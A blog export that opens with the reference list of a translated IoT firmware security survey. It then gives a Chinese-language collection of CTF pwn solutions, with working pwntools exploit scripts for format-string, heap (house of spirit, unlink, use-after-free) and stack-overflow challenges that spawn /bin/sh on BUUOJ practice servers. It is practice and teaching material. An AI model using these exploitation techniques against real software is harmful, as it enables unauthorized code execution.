<p>[^65]: Davidson, D.; Moench, B.; Ristenpart, T.; Jha, S. FIE on Firmware: Finding Vulnerabilities in Embedded Systems Using Symbolic Execution. In Proceedings of the 22nd USENIX Security Symposium (USENIX Security 13), Washington, DC, USA, 14–16 August 2013.</p>
<p>[^66]: Celik, Z.B.; Babun, L.; Sikder, A.K.; Aksu, H.; Tan, G.; McDaniel, P.; Uluagac, A.S. KLEE: Unassisted and Automatic Generation of High-Coverage Tests for Complex Systems Programs. In Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation(OSDI 2008), San Diego, CA, USA, 8–10 December 2008.</p>
<p>[^67]: Shoshitaishvili, Y.; Wang, R.; Hauser, C.; Kruegel, C.; Vigna, G. Firmalice-Automatic Detection of Authentication Bypass Vulnerabilities in Binary Firmware. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 8–11 February 2015.</p>
<p>[^68]: Celik, Z.B.; Babun, L.; Sikder, A.K.; Aksu, H.; Tan, G.; McDaniel, P.; Uluagac, A.S. Sensitive information tracking in commodity IoT. In Proceedings of the 27th USENIX Security Symposium (USENIX Security 18), Baltimore, MD, USA, 15–17 August 2018. Future Internet 2019, 12, 27 21 of 23</p>
<p>[^69]: Cheng, K.; Li, Q.; Wang, L.; Chen, Q.; Zheng, Y.; Sun, L.; Liang, Z. DTaint: detecting the taint-style vulnerability in embedded device firmware. In Proceedings of the 48th Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN), Luxembourg, 25–28 June 2018.</p>
<p>[^70]: Cui, A.; Stolfo, S.J. A quantitative analysis of the insecurity of embedded network devices: results of a wide-area scan. In Proceedings of the 26th Annual Computer Security Applications Conference, Austin, TX, USA, 6–10 December 2010.</p>
<p>[^71]: Al-Alami, H;, Ali, H.; Hussein, A.B. Vulnerability scanning of IoT devices in Jordan using Shodan. In Proceedings of the 2nd International Conference on the Applications of Information Technology in Developing Renewable Energy Processes &amp; Systems (IT-DREPS), Amman, Jordan, 6–7 December 2017.</p>
<p>[^72]: Durumeric, Z.; Adrian, D.; Mirian, A.; Bailey, M.; Halderman, J.A. A search engine backed by Internet-wide scanning. In Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security, Denver, CO, USA, 12–16 October 2015.</p>
<p>[^73]: Knownsec, Inc. Zoomeye. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv">https://www.zoomeye.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^74]: Li, Z.; Lu, S.; Myagmar, S.; Zhou, Y. CP-Miner: A Tool for Finding Copy-paste and Related Bugs in Operating System Code. In Proceedings of the 6th Symposium on Operating System Design and Implementation (OSDI 2004), San Francisco, CA, USA, 6–8 December 2004.</p>
<p>[^75]: Jang, J.; Agrawal, A.; Brumley, D. ReDeBug: finding unpatched code clones in entire os distributions. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 20–23 May 2012.</p>
<p>[^76]: Wikipedia. N-gram. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTi1ncmFt">https://en.wikipedia.org/wiki/N-gram<i class="fa fa-external-link-alt"></i></span> (accessed on 6December 2019).</p>
<p>[^77]: Myles, G.; Christian, C. K-gram based software birthmarks. In Proceedings of the 2005 ACM Symposium on Applied Computing, Santa Fe, NM, USA, 13–17 March 2005.</p>
<p>[^78]: Khoo, W.M.; Mycroft, A.; Anderson R. Rendezvous: A search engine for binary code. In Proceedings of the 10th Working Conference on Mining Software Repositories, San Francisco, CA, USA, 18–19 May 2013.</p>
<p>[^79]: Karim, M.E.; Walenstein, A.; Lakhotia, A.; Parida, L. Malware phylogeny generation using permutations of code. J. Comput. Virol. 2005, 1, 13–23. [CrossRef]</p>
<p>[^80]: David, Y.; Yahav, E. Tracelet-based code search in executables. Acm Sigplan Notices 2014, 49, 349–360.[CrossRef]</p>
<p>[^81]: Pewny, J.; Schuster, F.; Bernhard, L.; Holz, T.; Rossow, C. Leveraging semantic signatures for bug search in binary programs. In Proceedings of the 30th Annual Computer Security Applications Conference, New Orleans, LA, USA, 8–12 December 2014.</p>
<p>[^82]: Allen, F.E. Control flow analysis. ACM Sigplan Notices 1970, 55, 7. [CrossRef]</p>
<p>[^83]: Dullien, T.; Rolles, R. Graph-based comparison of executable objects. In Proceedings of the SSTIC’05, Rennes, France, 1–3 July 2005.</p>
<p>[^84]: Bourquin, M.; King, A.; Robbins, E. Binslayer: accurate comparison of binary executables. In Proceedings of the 2nd ACM SIGPLAN Program Protection and Reverse Engineering Workshop, Rome, Italy, 26 January 2013.</p>
<p>[^85]: Egele, M.; Woo, M.; Chapman, P.; Brumley, D. Blanket execution: Dynamic similarity testing for program binaries and components. In Proceedings of the 23rd USENIX Security Symposium (USENIX Security 14), San Diego, CA, USA, 20–22 August 2014.</p>
<p>[^86]: Gao, D.; Reiter, M.K.;Song, D. Binhunt: Automatically finding semantic differences in binary programs. In Proceedings of the International Conference on Information and Communications Security, Birmingham, UK, 20–22 October 2008.</p>
<p>[^87]: Ming, J.; Pan, M.; Gao, D. iBinHunt: Binary hunting with inter-procedural control flow. In Proceedings of the International Conference on Information Security and Cryptology, Seoul, Korea, 28–30 November 2012.</p>
<p>[^88]: Pewny, J.; Garmany, B.; Gawlik, R.; Rossow, C.; Holz, T. Cross-architecture bug search in binary executables. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Jose, CA, USA, 17–21 May 2015.</p>
<p>[^89]: Eschweiler, S.; Yakdan, K.; Gerhards-Padilla, E. discovRE: Efficient Cross-Architecture Identification of Bugs in Binary Code. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 21–24 February 2016.Future Internet 2019, 12, 27 22 of 23</p>
<p>[^90]: Chandramohan, M.; Xue, Y.; Xu, Z.; Liu, Y.; Cho, C.Y.; Tan, H.B.K. Bingo: Cross-architecture cross-os binary search. In Proceedings of the 24th ACM SIGSOFT International Symposium on Foundations of Software Engineering, Seattle, WA, USA, 13–18 November 2016.</p>
<p>[^91]: Feng, Q.; Zhou, R.; Xu, C.; Cheng, Y.; Testa, B.; Yin, H. Scalable graph-based bug search for firmware images. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Vienna, Austria, 24–28 October 2016.</p>
<p>[^92]: Yan, S.; Xu, D.; Zhang, B.; Zhang, H.J.; Yang, Q.; Lin, S. Graph embedding and extensions: A general framework for dimensionality reduction. IEEE Transact. Pattern Anal. Mach. Intell. 2007, 29, 40–51. [CrossRef]</p>
<p>[^93]: Xu, X.; Liu, C.; Feng, Q.; Yin, H.; Song, L.; Song, D. Neural network-based graph embedding for cross-platform binary code similarity detection. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Dallas, TX, USA, 30 October–3 November 2017.</p>
<p>[^94]: Liu, B.; Huo, W.; Zhang, C.; Li, W.; Li, F.; Piao, A.; Zou, W. αDiff: cross-version binary code similarity detection with DNN. In Proceedings of the 33rd ACM/IEEE International Conference on Automated Software Engineering, Montpellier, France, 3–7 September 2018.</p>
<p>[^95]: Gao, J.; Yang, X.; Fu, Y.; Jiang, Y.; Sun, J. Vulseeker: a semantic learning based vulnerability seeker for cross-platform binary. In Proceedings of the 33rd ACM/IEEE International Conference on Automated Software Engineering, Montpellier, France, 3–7 September 2018.</p>
<p>[^96]: Gao, J.; Yang, X.; Fu, Y.; Jiang, Y.; Shi, H.; Sun, J. Vulseeker-pro: enhanced semantic learning based binary vulnerability seeker with emulation. In Proceedings of the 26th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering, Tallinn, Estonia, 26–30 August 2019.</p>
<p>[^97]: Long, F.; Rinard, M. Prophet: Automatic Patch Generation via Learning from Successful Patches. <span class="exturl" data-url="aHR0cHM6Ly9jb3JlLmFjLnVrL2Rvd25sb2FkL3BkZi83ODA2Mjk0NS5wZGY=">https://core.ac.uk/download/pdf/78062945.pdf<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^98]: Long, F.; Rinard, M. Automatic patch generation by learning correct code. In Proceedings of the 43rd Annual ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages, St. Petersburg, FL, USA, 20–22 January 2016.</p>
<p>[^99]: Long, F.; Amidon, P.; Rinard, M. Automatic inference of code transforms for patch generation. In Proceedings of the 11th Joint Meeting on Foundations of Software Engineering, Paderborn, Germany, 4–8 September 2017.</p>
<p>[^100]: Le Goues, C.; Nguyen, T.; Forrest, S.; Weimer, W. Genprog: A generic method for automatic software repair. IEEE Trans. Soft. Eng. 2011, 38, 54–72. [CrossRef]</p>
<p>[^101]: Kim, D.; Nam, J.; Song, J.; Kim, S. Automatic patch generation learned from human-written patches. In Proceedings of the International Conference on Software Engineering, San Francisco, CA, USA, 18–26 May 2013.</p>
<p>[^102]: Zhang, Y.; Chen, Y.; Bao, C.; Xia, L.; Zhen, L.; Lu, Y.; Wei, T. Adaptive kernel live patching: An open collaborative effort to ameliorate android n-day root exploits. In Proceedings of Black Hat USA, Las Vegas, NA, USA, 30 July–4 August 2016.</p>
<p>[^103]: DARPA. Cyber Grand Challenge. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGFycGEubWlsL3Byb2dyYW0vY3liZXItZ3JhbmQlRUYlQkYlQkVjaGFsbGVuZ2U=">https://www.darpa.mil/program/cyber-grand￾challenge<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^104]: Shoshitaishvili, Y.; Bianchi, A.; Borgolte, K.; Cama, A.; Corbetta, J.; Disperati, F.; Dutcher, A.; Grosen, J.;Grosen, P.;Machiry, A.; etc. Mechanical phish: Resilient autonomous hacking. IEEE Secur. Priv. 2018, 16, 12–22. [CrossRef]</p>
<p>[^105]: Shoshitaishvili, Y.; Weissbacher, M.; Dresel, L.; Salls, C.; Wang, R.; Kruegel, C.; Vigna, G. Rise of the hacrs: Augmenting autonomous cyber reasoning systems with human assistance. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Dallas, TX, USA, 30 October–3 November 2017.</p>
<p>[^106]: Nguyen-Tuong, A.; Melski, D.; Davidson, J.W.; Co, M.; Hawkins, W.; Hiser, J.D.;Morris, D.; Nguyen, D.; Rizzi, E. Xandra: An Autonomous Cyber Battle System for the Cyber Grand Challenge. IEEE Secur. Priv.2018, 16, 42–51. [CrossRef]</p>
<p>[^107]: Fernandes, E.; Jung, J.; Prakash, A. Security analysis of emerging smart home applications. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Jose, CA, USA, 22–26 May 2016.</p>
<p>[^108]: Fernandes, E.; Paupore, J.; Rahmati, A.; Simionato, D.; Conti, M.; Prakash, A. Flowfence: Practical data protection for emerging IoT application frameworks. In Proceedings of the 25th USENIX Security Symposium (USENIX Security 16), Austin, TX, USA, 10–12 August 2016. Future Internet 2019, 12, 27 23 of 23</p>
<p>[^109]: Jia, Y.J.; Chen, Q.A.; Wang, S.; Rahmati, A.; Fernandes, E.; Mao, Z.M.; Prakash, A. ContexloT: Towards Providing Contextual Integrity to Appified IoT Platforms. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 26 February–1 March 2017.</p>
<p>[^110]: Rahmati, A.; Fernandes, E.; Eykholt, K.; Prakash, A. Tyche: A risk-based permission model for smart homes. In Proceedings of the IEEE Cybersecurity Development (SecDev), Cambridge, MA, USA, 30 September–2 October 2018.</p>
<p>[^111]: Tian, Y.; Zhang, N.; Lin, Y.H.; Wang, X.; Ur, B.; Guo, X.; Tague, P. Smartauth: User-centered authorization for the internet of things. In proceedings of the 26th USENIX Security Symposium (USENIX Security 17), Vancouver, BC, Canada, 16–18 August 2017.</p>
<p>[^112]: Lee, S.; Choi, J.; Kim, J.; Cho, B.; Lee, S.; Kim, H.; Kim, J. FACT: Functionality-centric access control system for IoT programming frameworks. In Proceedings of the 22nd ACM on Symposium on Access Control Models and Technologies, Indianapolis, IN, USA, 21–23 June 2017.</p>
<p>[^113]: Cui, A.; Costello, M.; Stolfo, S. When firmware modifications attack: A case study of embedded exploitation. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 24–27 February 2013.</p>
<p>[^114]: Goodfellow, I.; Pouget-Abadie, J.; Mirza, M.; Xu, B.; Warde-Farley, D.; Ozair, S.; Courville, A.; Bengio, Y. Generative adversarial nets. In Proceedings of the Advances in Neural Information Processing Systems 27 (NIPS 2014), Montreal, QC, Canada, 8–13 December 2014.</p>
<p>[^115]: Hiromoto, R.E.; Haney, M.; Vakanski, A. A secure architecture for IoT with supply chain risk management. In Proceedings of the 9th IEEE International Conference on Intelligent Data Acquisition and Advanced Computing Systems: Technology and Applications (IDAACS), Bucharest, Romania, 21–23 September 2017.</p>
]]></content>
      <tags>
        <tag>论文翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn刷题</title>
    <url>/26324.html</url>
    <content><![CDATA[<p>把之前记的一些题目汇总了一下，没有任何顺序，好像也不是很全…</p>
<span id="more"></span>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MzQzMjAxL2FydGljbGUvZGV0YWlscy82NjQ3MzE0MA==">堆相关漏洞利用libc异常提示原因记录_jmp esp-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="wdb-2018-2nd-easyfmt">wdb_2018_2nd_easyfmt</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = process(&quot;./fmt&quot;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,27907)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">elf = ELF(&quot;./fmt&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">printfgot = elf.got[&#x27;printf&#x27;]</span><br><span class="line"></span><br><span class="line">print p.recv()</span><br><span class="line">p.sendline(p32(printfgot)+&quot;%6$s&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">#print p.recv()</span><br><span class="line">print p.recv(4)</span><br><span class="line"></span><br><span class="line">#printf = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">printf = u32(p.recv(4))</span><br><span class="line">print hex(printf)</span><br><span class="line">#libc = DynELF(leak,elf=elf_)</span><br><span class="line">libc=LibcSearcher(&quot;printf&quot;,printf)</span><br><span class="line">#ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">system = printf - libc.dump(&quot;printf&quot;) + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">#system = printf - libc.sym[&#x27;printf&#x27;] + libc.sym[&#x27;system&#x27;]</span><br><span class="line">success(hex(system))</span><br><span class="line">#print_addr = </span><br><span class="line"></span><br><span class="line">## useful tool:</span><br><span class="line">payload = fmtstr_payload(6,&#123;printfgot: system&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">sleep(0)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-EasyHeap">[ZJCTF 2019]EasyHeap</h2>
<p>文件和Hitcon Lab 14一样，但buu的环境里/home/ctf是空的，改用house of spirit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28283</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">	p.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6020e8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;aaa&quot;</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;bbbb&quot;</span>)	<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;cccc&quot;</span>)	<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span>-<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;9&quot;</span>)</span><br><span class="line">payload2 = p64(<span class="number">9</span>)*<span class="number">6</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">3</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一种做法：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY3NzczMS9hcnRpY2xlL2RldGFpbHMvMTA4MjA0MjQ0">buuctf [ZJCTF 2019]EasyHeap_R1nd0的博客-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ptr=<span class="number">0x6020e8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)	<span class="comment">#heaparray&#x27;s chunk#1_ptr changed</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_got)</span><br><span class="line">payload+=p64(ptr-<span class="number">0x18</span>)+p64(ptr+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">#fake_chunk in bss</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-Login">[ZJCTF 2019]Login</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29972</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;username: &quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">passwd = <span class="string">&quot;2jctf_pa5sw0rd&quot;</span></span><br><span class="line">back = <span class="number">0x400E88</span></span><br><span class="line">payload = passwd + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x48</span>-<span class="built_in">len</span>(passwd)) + p64(back)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="wdb-2018-1st-babyheap">wdb_2018_1st_babyheap</h2>
<ol>
<li>uaf泄露堆地址</li>
<li>伪造chunk触发unlink，泄露main_arena+0x58的地址</li>
<li>计算free_hook和system地址，写入free_hook</li>
<li>触发free(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./w&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29942</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#sleep(4)</span></span><br><span class="line">allocate(<span class="number">0</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))*<span class="number">2</span>)</span><br><span class="line">allocate(<span class="number">1</span>,<span class="string">&quot;bbbb\n&quot;</span>)</span><br><span class="line">allocate(<span class="number">2</span>,<span class="string">&quot;cccc\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">3</span>,<span class="string">&quot;dddd\n&quot;</span>)</span><br><span class="line">allocate(<span class="number">4</span>,<span class="built_in">str</span>(<span class="string">&quot;/bin/sh\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x602060</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">5</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap)+p64(bss-<span class="number">0x10</span>))	<span class="comment">#chunk0</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">6</span>, p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))<span class="comment"># pre_chunk == 0x20, the_hunk == 0x90</span></span><br><span class="line">allocate(<span class="number">7</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>))	<span class="comment"># build chunk1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)	<span class="comment">#unlink</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">mallochook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))- <span class="number">0x68</span></span><br><span class="line"><span class="comment">#(0x00007f5a6e089b78 - 0x00007f5a6e089b10)</span></span><br><span 